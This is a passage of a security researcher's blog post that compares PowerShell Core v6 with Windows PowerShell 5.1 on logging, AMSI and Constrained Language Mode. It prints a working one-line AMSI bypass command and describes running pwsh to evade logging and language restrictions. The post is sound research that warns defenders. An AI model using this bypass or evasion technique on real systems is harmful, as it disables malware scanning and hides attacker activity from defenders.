+&nbsp;<a href="https://2.bp.blogspot.com/-5ITg01EBUGo/Wlt_oj_KXfI/AAAAAAAAEdM/msofTqCKa-ICJ4CY3sAw_8p_4Y6ZuTKXwCLcBGAs/s1600/v6_logging.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="443" data-original-width="664" height="266" src="https://2.bp.blogspot.com/-5ITg01EBUGo/Wlt_oj_KXfI/AAAAAAAAEdM/msofTqCKa-ICJ4CY3sAw_8p_4Y6ZuTKXwCLcBGAs/s400/v6_logging.png" width="400" /></a></div>
+Interestingly, while testing the warning level logs, I found out that v6 excels over v5.1 and logs less false positives. For example, one of suspicious strings (see <a href="https://github.com/PowerShell/PowerShell/blob/v6.0.0/src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs#L1516-L1652">code here</a>) "GetMembers" is logged by 5.1 even if it is just executed senselessly.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-nHLDNKEKqcg/WluBDLfQ95I/AAAAAAAAEdY/PnQcPFLjHrICzghZvcfh63TX3UkU6DbgQCLcBGAs/s1600/v5_falsepositive.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="664" data-original-width="1260" height="210" src="https://1.bp.blogspot.com/-nHLDNKEKqcg/WluBDLfQ95I/AAAAAAAAEdY/PnQcPFLjHrICzghZvcfh63TX3UkU6DbgQCLcBGAs/s400/v5_falsepositive.png" width="400" /></a></div>
+But in case of v6, the above is not logged unless, there is a proper use of "GetMembers".<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-3b-1nncqJD4/WluB7BZEzqI/AAAAAAAAEdg/7bv3Fk5Y_lgdbbGBrvXMm16i3SHhS8EFgCLcBGAs/s1600/v6_truepositive.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="484" data-original-width="590" height="327" src="https://4.bp.blogspot.com/-3b-1nncqJD4/WluB7BZEzqI/AAAAAAAAEdg/7bv3Fk5Y_lgdbbGBrvXMm16i3SHhS8EFgCLcBGAs/s400/v6_truepositive.png" width="400" /></a></div>
+I find this very interesting and will have an in-depth look at it later on. May be, it could help in some interesting findings.</div>
+<div style="text-align: justify;">
+<br /></div>
+<h3 style="text-align: justify;">
+AntiMalware Scan Interface (AMSI)</h3>
+<div style="text-align: justify;">
+AMSI provides the content of a script tor script block to the registered antivirus before execution takes place. This enables the antivirus to detect known bad scripts and script blocks regardless of input method (disk, memory, manual) and even encoded and obfuscated scripts. I spoke about AMSI at BlackHat USA 2016 and did a <a href="http://www.labofapenetrationtester.com/2016/09/amsi.html">detailed blog post</a>.</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+Fortunately, AMSI is enabled for PowerShell v6 as well. Although, <a href="https://twitter.com/mattifestation/status/735261176745988096">Matt's bypass</a> still works with just a minor modification. </div>
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</textarea></pre>
+But, once again, since it still increases cost to an attacker, its great to have AMSI in v6.<br />
+<div style="text-align: justify;">
+<br /></div>
+<h3 style="text-align: left;">
+Constrained Language Mode</h3>
+<div style="text-align: justify;">
+If "Allow mode" is enforced for Applocker or Device Guard, PowerShell is restricted automatically to the Constrained Language Mode which restricts Windows API, interaction with COM etc. See <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-5.1">Language Modes</a></div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+That is not the case with v6!<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-sYun_KxrStM/WltvgKyR65I/AAAAAAAAEc8/uxthy46S5AQ0n0GAX5anE7CA__XtKWkTACLcBGAs/s1600/PowerShellv6_LanguageMode.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="368" data-original-width="1069" height="137" src="https://4.bp.blogspot.com/-sYun_KxrStM/WltvgKyR65I/AAAAAAAAEc8/uxthy46S5AQ0n0GAX5anE7CA__XtKWkTACLcBGAs/s400/PowerShellv6_LanguageMode.png" width="400" /></a></div>
+<h3>
+</h3>
+</div>
+<div style="text-align: justify;">
+<h3>
+&nbsp;</h3>
+<h3>
+Introducing the PowerShell Upgrade Attack</h3>
+</div>
+<div style="text-align: justify;">
+PowerShell downgrade attack is popular with red teams. If you can run PowerShell v2, ALL security measures we have seen are bypassed as v2 simply doesn't support them. Lee provided <a href="http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/">an excellent guide</a> on how to detect and prevent such attacks. If v2 is blocked or no required .NET version is installed, what to do? Simply run <b>pwsh</b> from your PowerShell session and you will drop in a new PowerShell session (v6 - if installed) which has minimal security features compared to v5/5.1. I am calling it the <b>PowerShell Upgrade Attack</b> <b>:P</b>. On a serious note, please keep in mind that Windows PowerShell - with enhanced logging - is the default one on Windows OS. Also, v6 is not an update, it needs to be installed separately. Windows PowerShell and PowerShell Core can be installed on a single machine and both will work independently. <br />
+<br />
+<h3>
+So, what next?</h3>
+I hold the PowerShell Team in high regard (for creating such a useful tool, being open to criticism and acting on the feedback) and quite confident (and hope) that they will address these shortcomings soon. Jeffery already <a href="https://twitter.com/jsnover/status/951118940293414912">tweeted that</a> the Constrained Language Mode will be fixed in 6.1. But, if your production environment is working fine with Windows PowerShell v5/5.1, I would not advise to install v6 on any system (at least not the production ones). </div>
+<div style="text-align: justify;">
+</div>
+<div style="text-align: justify;">
+<br />
+UPDATE (25-Jan-2018) - <a href="https://blogs.msdn.microsoft.com/powershell/2018/01/24/powershell-core-6-1-roadmap/">The PowerShell Core Roadmap is published</a> and there is no mention of bringing Core logging in parity with Windows PowerShell 5.1. Thankfully, the DeviceGuard/Applocker policy enforcement will get fixed. <br />
+<br /></div>
+</div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
+<span itemprop='name'>Nikhil SamratAshok Mittal</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://www.labofapenetrationtester.com/2018/01/powershell6.html' itemprop='url'/>
+<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/01/powershell6.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-01-14T23:01:00+05:30'>11:01 PM</abbr></a>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/01/powershell6.html#comment-form' onclick=''>
+No comments:
+    </a>
+</span>
+<span class='post-backlinks post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/01/powershell6.html#links'>Links to this post</a>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-1005506833'>
+<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=8856735318867349918&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8856735318867349918&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8856735318867349918&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8856735318867349918&target=twitter' target='_blank' title='Share to Twitter'><span class='share-button-link-text'>Share to Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8856735318867349918&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8856735318867349918&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://www.labofapenetrationtester.com/search/label/AMSI' rel='tag'>AMSI</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Applocker' rel='tag'>Applocker</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell' rel='tag'>Offensive PowerShell</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams' rel='tag'>Offensive PowerShell for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Powershell' rel='tag'>Powershell</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/PowerShell%20Core' rel='tag'>PowerShell Core</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Pen%20Test' rel='tag'>PowerShell for Pen Test</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Red%20Team' rel='tag'>PowerShell for Red Team</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/PowerShellv6' rel='tag'>PowerShellv6</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Red%20Team' rel='tag'>Red Team</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+</div>
+
+        </div></div>
+      
+</div>
+<div class='blog-pager' id='blog-pager'>
+<span id='blog-pager-older-link'>
+<a class='blog-pager-older-link' href='https://www.labofapenetrationtester.com/search?updated-max=2018-01-14T23:01:00%2B05:30&max-results=5' id='Blog1_blog-pager-older-link' title='Older Posts'>Older Posts</a>
+</span>
+<a class='home-link' href='https://www.labofapenetrationtester.com/'>Home</a>
+</div>
+<div class='clear'></div>
+<div class='blog-feeds'>
+<div class='feed-links'>
+Subscribe to:
+<a class='feed-link' href='https://www.labofapenetrationtester.com/feeds/posts/default' target='_blank' type='application/atom+xml'>Posts (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class='column-left-outer'>
+<div class='column-left-inner'>
+<aside>
+</aside>
+</div>
+</div>
+<div class='column-right-outer'>
+<div class='column-right-inner'>
+<aside>
+<div class='sidebar section' id='sidebar-right-1'><div class='widget Profile' data-version='1' id='Profile1'>
+<h2>About Me</h2>
+<div class='widget-content'>
+<a href='https://www.blogger.com/profile/02092541175521734123'><img alt='My photo' class='profile-img' height='80' src='//2.bp.blogspot.com/-Uf2X0bvhQOk/WyHoga2dcsI/AAAAAAAAEsc/UUJS5DOk4FI9_Ng9OJqOlTThkIr11GbEgCK4BGAYYCw/s80/Nikhil_Mittal_.JPG' width='80'/></a>
+<dl class='profile-datablock'>
+<dt class='profile-data'>
+<a class='profile-name-link g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' style='background-image: url(//www.blogger.com/img/logo-16.png);'>
+Nikhil SamratAshok Mittal
+</a>
+</dt>
+<dd class='profile-textblock'>I am a hacker, information security researcher and enthusiast. On this blog, I write about my projects, experiments and presentations. </dd>
+</dl>
+<a class='profile-link' href='https://www.blogger.com/profile/02092541175521734123' rel='author'>View my complete profile</a>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=Profile&widgetId=Profile1&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("Profile1"));' rel='nofollow' target='configProfile1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div><div class='widget LinkList' data-version='1' id='LinkList1'>
+<h2>My Projects</h2>
+<div class='widget-content'>
+<ul>
+<li><a href='https://github.com/samratashok/nishang'>Nishang - Using PowerShell for Penetration Testing</a></li>
+<li><a href='https://github.com/samratashok/Deploy-Deception'>Deploy-Deception - Deploy active directory decoy objects</a></li>
+<li><a href='https://github.com/samratashok/Kautilya'>Kautilya - Pwnage with Human Interface Devices</a></li>
+</ul>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=LinkList&widgetId=LinkList1&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("LinkList1"));' rel='nofollow' target='configLinkList1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div><div class='widget Text' data-version='1' id='Text1'>
+<h2 class='title'>My upcoming Trainings/Talks</h2>
+<div class='widget-content'>
+<a href="https://www.brucon.org/2019/brucon-2019-training/active-directory-attacks-for-red-and-blue-teams/">April 24-26 2019, Active Directory Attacks for Red and Blue Teams - Three days training at BruCON, Belgium</a><div><a href="https://www.blackhat.com/us-19/training/schedule/#active-directory-attacks-for-red-and-blue-teams---advanced-edition-14246"><br /></a></div><div><a href="https://www.blackhat.com/us-19/training/schedule/#active-directory-attacks-for-red-and-blue-teams---advanced-edition-14246">August 3-4 2019, Active Directory Attacks for Red and Blue Teams - Advanced Edition - Two days training at BlackHat, USA</a></div><div><br /></div><div><a href="https://www.blackhat.com/us-19/training/schedule/#active-directory-attacks-for-red-and-blue-teams---advanced-edition-142461547495814">August 5-6 2019, Active Directory Attacks for Red and Blue Teams - Advanced Edition - Two days training at BlackHat, USA</a></div><div><br /></div><div><a href="https://44con.com/44con-training/advanced-windows-tradecraft/">September 9-11 2019, Advanced Windows Tradecraft - Three days training at 44CON, London</a><br /></div>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=Text&widgetId=Text1&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("Text1"));' rel='nofollow' target='configText1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div><div class='widget Text' data-version='1' id='Text3'>
+<h2 class='title'>Online Labs</h2>
+<div class='widget-content'>
+<div><a href="https://www.pentesteracademy.com/redteamlab">RedTeam Lab - Challenge Lab for Windows and Active Directory Red Team Operations</a></div><div><br /></div><div><a href="https://www.pentesteracademy.com/activedirectorylab">ActiveDirectory Lab - Practice Lab for Windows and Active Directory Red Team operations</a><br /></div>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=Text&widgetId=Text3&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("Text3"));' rel='nofollow' target='configText3' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div><div class='widget Text' data-version='1' id='Text2'>
+<h2 class='title'>Video Courses</h2>
+<div class='widget-content'>
+<a href="https://www.pentesteracademy.com/course?id=21">PowerShell for Penetration Testers</a><br /><a href="http://promo.securitytube-training.com/wmi"><br /></a><a href="https://www.pentesteracademy.com/course?id=34">WMI Attacks and Defense at PentesterAcademy</a><br /><a href="http://promo.securitytube-training.com/mssql"><br /></a><div><a href="https://www.pentesteracademy.com/course?id=35">Abusing SQL Server Trusts</a></div><div><br /></div><div><a href="https://www.pentesteracademy.com/course?id=47">Attacking and Defending Active Directory</a><br /></div>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=Text&widgetId=Text2&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("Text2"));' rel='nofollow' target='configText2' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
+<h2>Blog Archive</h2>
+<div class='widget-content'>
+<div id='ArchiveList'>
+<div id='BlogArchive1_ArchiveList'>
+<ul class='hierarchy'>
+<li class='archivedate expanded'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy toggle-open'>
+
+        &#9660;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/'>
+2018
+</a>
+<span class='post-count' dir='ltr'>(5)</span>
+<ul class='hierarchy'>
+<li class='archivedate expanded'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy toggle-open'>
+
+        &#9660;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+<ul class='posts'>
+<li><a href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html'>Using ActiveDirectory module for Domain Enumeratio...</a></li>
+<li><a href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html'>Forging Trusts for Deception in Active Directory</a></li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/'>
+2017
+</a>
+<span class='post-count' dir='ltr'>(7)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(5)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/03/'>
+March
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/'>
+2016
+</a>
+<span class='post-count' dir='ltr'>(5)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/'>
+2015
+</a>
+<span class='post-count' dir='ltr'>(20)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(5)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(6)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/'>
+2014
+</a>
+<span class='post-count' dir='ltr'>(12)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/07/'>
+July
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/'>
+2013
+</a>
+<span class='post-count' dir='ltr'>(10)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
